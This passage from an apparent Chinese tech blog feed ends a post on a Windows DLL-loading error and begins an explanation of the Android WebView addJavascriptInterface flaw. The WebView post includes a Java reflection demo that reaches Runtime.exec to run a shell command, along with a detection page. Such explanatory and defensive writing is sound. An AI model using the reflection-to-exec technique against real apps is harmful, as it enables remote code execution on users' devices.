resource ID 1 if you build an .exe, and resource</span><br><span class="line">ID 2 if you build a .dll. For more information, see How to: Embed a Manifest</span><br><span class="line">Inside a C/C++ Application.</span><br></pre></td></tr></table></figure><p>大概的意思是需要使用manifest.xml来指定需要加载的DLL。上网又翻看了几个链接发现这个错误的成因比较复杂，主要原因是加载mscvr*.dll 出现了问题。不管怎样还是先看看是否使用了 manifest。从微软的解决办法可以知道，manifest很有可能在资源文件里。</p><p>还是先看看manifest的作用，在msdn网站搜索相关内容，根据《Understanding Manifest Generation for C&#x2F;C++ Programs》中的内容，manfest.xml可以是一个外部的XML文件也可以是嵌入在程序的资源文件中。manifest.xml用于管理程序在运行时需要的共享程序集的名字和版本。如果程序只依赖 VisualC++ 的程序集（CRT，MFC，ATL等），manifest会被链接器自动生成。Manifest的Sxs指定了其依赖的清单名称,版本,资源,和其他组件。Sxs是Windows XP引入的新技术，vs 2005 开始使用，全名叫Side by Side assembly，主要还是为了解决兼容性问题，这样同一个系统可以存在不同版本的同名文件而互相不影响各自的运行。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/sxs.png" alt="sxs"></p><p>现在需要定位gvim.exe加载哪个DLL引起了R6034错误，使用Process Explorer发现是加载ycm_client_support.pyd导致。删除YouCompleteMe插件后错误消失。</p><p>先看看ycm_client_support.pyd是否使用了manifest.xml, 使用神器TC,  F3一下，可以查看manifest的情况。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/manifest.png" alt="manifest.xml"></p><p>发现其实ycm_client_support.pyd已经使用了manifest，但是仍然出现R6034错误。上网搜索了一番（见文末的参考链接），发现这就是非常著名的DLL Hell了，维基百科中专门记录了这个问题。 <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a></p><p>不论如何应该就是DLL加载时出错了，可以使用Process Explorer 工具来查看出问题的进程，看看在进程空间内具体是什么情况。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer.png" alt="p-e"></p><p>哈哈，发现了一些情况，msvcr90.dll在gvim进程空间里有两个！再看看这两个DLL的位置。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer1.png" alt="p-e1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer2.png" alt="p-e2"></p><p>删除掉不在C:\WINDOWS\WinSxS\目录里的msvcr90.dll，问题得以解决。由于这个错误是因为加载ycm_client_support.pyd引起的，再看看ycm_client_support.pyd的情况，拿出TC直接F3一下，又发现了一些有用的信息。ycm_client_support.pyd加载的是cmake目录下的msvcr90.dll, 正常情况下因该使用 C:\Windows\winsxs 目录下的msvcr90.dll</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc1.png" alt="tc1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc2.png" alt="tc2"></p><p>查看一下系统环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\Microsoft Visual Studio 9.0\VC&gt; set | findstr Path</span><br><span class="line"></span><br><span class="line">Path=D:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE;D:\Program Files\M</span><br><span class="line">icrosoft Visual Studio 9.0\VC\BIN;D:\Program Files\Microsoft Visual Studio 9.0\C</span><br><span class="line">ommon7\Tools;c:\Windows\Microsoft.NET\Framework\v3.5;c:\Windows\Microsoft.NET\Fr</span><br><span class="line">amework\v2.0.50727;D:\Program Files\Microsoft Visual Studio 9.0\VC\VCPackages;C:</span><br><span class="line">\Program Files\\Microsoft SDKs\Windows\v6.0A\bin;C:\Windows\system32;C:\Windows;</span><br><span class="line">d:\Program Files\CMake 2.8\bin;d:\Program Files\LLVM 3.4.svn\bin;d:\Program File</span><br><span class="line">s\Git\cmd;d:\Python27;D:\Program Files\IDM Computer Solutions\UltraEdit\</span><br><span class="line">PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\</span><br></pre></td></tr></table></figure><p>引错误的原因是Windows程序加载DLL是会先加载PATH变量中的DLL文件，后面会加载manifest指定的WinSxS目录的文件，这样就加载了两次，引起了错误。</p><p>这个问题涉及 Windows加载DLL文件的顺序，Windows定位 DLL文件的顺序和一个注册表键值相关，这个键值是：</p><p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code></p><p>SafeDllSearchMode的值为1，开启SafeDllSearchMode，<br>SafeDllSearchMode的值为0，禁用SafeDllSearchMode。</p><p>Windows系统默认开启SafeDllSearchMode （Windows XP SP2 后），MSDN文章《Dynamic-Link Library Search Order》中指出，在SafeDllSearchMode开启的情况下，Windows定位DLL文件的顺序为：</p><ol><li>The directory from which the application loaded.</li><li>The system directory. ( GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. (GetWindowsDirectory )</li><li>The current directory.</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>在SafeDllSearchMode关闭的情况下，Windows定位DLL文件的顺序为：</p><ol><li>The directory from which the application loaded.</li><li>The current directory.</li><li>The system directory. (GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. ( GetWindowsDirectory)</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>另外，《Dynamic-Link Library Search Order》中指出使用manifest可以指定加载DLL的路径，但实际的情况是有可能加载多个DLL导致进程崩溃。</p><p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]《Windows via C&#x2F;C++ Fifth Edition》<br>[2] Side-by-side Assemblies <a href="http://msdn.microsoft.com/en-us/library/aa376307.aspx">http://msdn.microsoft.com/en-us/library/aa376307.aspx</a><br>[3] DLL Hell <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a><br>[4] C Run-Time Error R6034 <a href="http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx">http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx</a><br>[5] Understanding Manifest Generation for C&#x2F;C++ Programs <a href="http://msdn.microsoft.com/en-us/library/ms235542.aspx">http://msdn.microsoft.com/en-us/library/ms235542.aspx</a><br>[6] Search Path Used by Windows to Locate a DLL <a href="http://msdn.microsoft.com/en-us/library/7d83bc18.aspx">http://msdn.microsoft.com/en-us/library/7d83bc18.aspx</a><br>[7] Dynamic-Link Library Search Order <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a><br>[8] <a href="https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master">https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master</a><br>[9] <a href="https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide">https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide</a><br>[10] <a href="http://www.davidlenihan.com/2007/07/winsxs.html">http://www.davidlenihan.com/2007/07/winsxs.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/</summary>
      
    
    
    
    
    <category term="windows" scheme="http://usmacd.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Android WebView 漏洞</title>
    <link href="http://usmacd.com/cn/webview_java/"/>
    <id>http://usmacd.com/cn/webview_java/</id>
    <published>2023-09-06T03:00:51.896Z</published>
    <updated>2023-09-06T03:00:51.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void addJavascriptInterface (Object object, String name)  Added in API level 1</span><br><span class="line"></span><br><span class="line">Injects the supplied Java object into this WebView. The object is injected into</span><br><span class="line">the JavaScript context of the main frame, using the supplied name. This allows </span><br><span class="line">the Java object&#x27;s methods to be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN_MR1 and above, only public methods that are </span><br><span class="line">annotated with JavascriptInterface can be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)</span><br><span class="line">can be accessed, see the important security note below for implications.</span><br><span class="line"></span><br><span class="line">Note that injected objects will not appear in JavaScript until the page is next</span><br><span class="line">(re)loaded. For example:</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">   <span class="meta">@JavascriptInterface</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;injectedObject&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(), <span class="string">&quot;injectedObject&quot;</span>);</span><br><span class="line">webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">webView.loadUrl(<span class="string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This method can be used to allow JavaScript to control the host application. </span><br><span class="line">This is a powerful feature, but also presents a security risk for apps targeting</span><br><span class="line">JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still</span><br><span class="line">vulnerable if the app runs on a device running Android earlier than 4.2. The </span><br><span class="line">most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the</span><br><span class="line">method is called only when running on Android 4.2 or later. With these older </span><br><span class="line">versions, JavaScript could use reflection to access an injected object&#x27;s public</span><br><span class="line">fields. Use of this method in a WebView containing untrusted content could allow</span><br><span class="line">an attacker to manipulate the host application in unintended ways, executing </span><br><span class="line">Java code with the permissions of the host application. Use extreme care when </span><br><span class="line">using this method in a WebView which could contain untrusted content.</span><br><span class="line">JavaScript interacts with Java object on a private, background thread of this </span><br><span class="line">WebView. Care is therefore required to maintain thread safety.</span><br><span class="line"></span><br><span class="line">The Java object&#x27;s fields are not accessible.</span><br><span class="line">For applications targeted to API level LOLLIPOP and above, methods of injected </span><br><span class="line">Java objects are enumerable from JavaScript. Parameters object the Java object </span><br><span class="line">to inject into this WebView&#x27;s JavaScript context. Null values are ignored.</span><br><span class="line">name  the name used to expose the object in JavaScript</span><br></pre></td></tr></table></figure><p>  之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App<br>  通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不<br>  需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。</p><h2 id="☆-相关知识"><a href="#☆-相关知识" class="headerlink" title="☆ 相关知识"></a>☆ 相关知识</h2><h3 id="WebView的使用方法"><a href="#WebView的使用方法" class="headerlink" title="WebView的使用方法"></a>WebView的使用方法</h3><p>  在layout中定义 <webview>, 在Activity的onCreate中加入下面的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>);</span><br><span class="line">setContentView(webview);</span><br><span class="line">webview.loadUrl(<span class="string">&quot;http://slashdot.org/&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，<br>而不需要在编译的时候知道类的名字和方法等细节信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> mObjectClass.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        String[] array = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &gt; /tmp/id&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">n</span> <span class="operator">=</span> c2.getMethod(<span class="string">&quot;exec&quot;</span>, array.getClass());</span><br><span class="line">        n.invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;array&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a2</span><br><span class="line">method = a1</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = equals</span><br><span class="line">method = toString</span><br><span class="line">method = hashCode</span><br><span class="line">method = getClass</span><br><span class="line">method = notify</span><br><span class="line">method = notifyAll</span><br></pre></td></tr></table></figure><p>命令执行成功。</p><h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getDeclaredMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> mObjectClass.newInstance();</span><br><span class="line">        methods[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods[<span class="number">0</span>].invoke(o);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a1</span><br><span class="line">method = a2</span><br><span class="line">I am a1</span><br></pre></td></tr></table></figure><p>已经成功调用了Demo的private a1 方法</p><h2 id="☆-相关漏洞"><a href="#☆-相关漏洞" class="headerlink" title="☆  相关漏洞"></a>☆  相关漏洞</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版<br>本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网<br>页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启）</p><h3 id="CVE-2012-6636-关键的CVE"><a href="#CVE-2012-6636-关键的CVE" class="headerlink" title="CVE-2012-6636  (关键的CVE)"></a>CVE-2012-6636  (关键的CVE)</h3><p>该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可<br>通过使用Java Reflection 利用该漏洞执行任意Java对象的方法。影响使用 API Level 16<br>以及之前的Android 系统。(Android 4.2 为 API Level 17)</p><h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>此漏洞公布了一个可利用的Java Object “searchBoxJavaBridge_”</p><h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>根据 android&#x2F;webkit&#x2F;AccessibilityInjector.java 代码中的介绍，发现当系统辅助<br>功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，<br>分别为是”accessibility”  和 “accessibilityTraversal”。如果APP使用了系统的WebView<br>并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和<br>“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的<br>do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。</p><h2 id="☆-漏洞检测"><a href="#☆-漏洞检测" class="headerlink" title="☆ 漏洞检测"></a>☆ 漏洞检测</h2><p>   使用WebView访问下面页面，输出的接口名称则存在漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0,</span></span></span><br><span class="line"><span class="string"><span class="tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="variable language_">window</span>) </span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>[obj].<span class="title function_">getClass</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">check</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。<br>   是否有getClass的方法，可以作为检测WebView漏洞依据。</p><p>   在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_<br>   可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须<br>   打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口，<br>   因此CVE-2014-7224的影响并不像想象中的那么大。</p><h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 